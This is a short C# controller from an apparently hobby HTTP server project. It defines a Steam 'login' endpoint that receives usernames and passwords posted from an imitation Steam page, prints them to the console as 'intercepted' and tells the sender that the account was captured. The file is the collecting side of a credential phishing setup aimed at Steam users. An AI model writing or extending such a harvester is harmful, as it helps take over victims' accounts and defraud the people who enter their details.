using MyHttpServer.Framework.Attributes;
using MyHttpServer.Framework.Results;
using System;
using System.Net;
using MyHttpServer_ORIS.Framework;
using System.Net.Mail;

namespace MyHttpServer_ORIS.Controllers
{
    [HttpController("steam")]
    public class SteamController : BaseController
    {
        // Этот метод поймает POST-запрос с вашей странички Steam: /steam/login
        [Post("login")]
        public IHttpResult SteamLogin(string login, string password)
        {
            
            Console.WriteLine($" [STEAM] Перехвачен вход!");
            Console.WriteLine($" Логин: {login}");
            Console.WriteLine($" Пароль: {password}");
            

        
            return new TextResult($"Steam аккаунт '{login}' успешно перехвачен сервером!");
        }


        
    }
}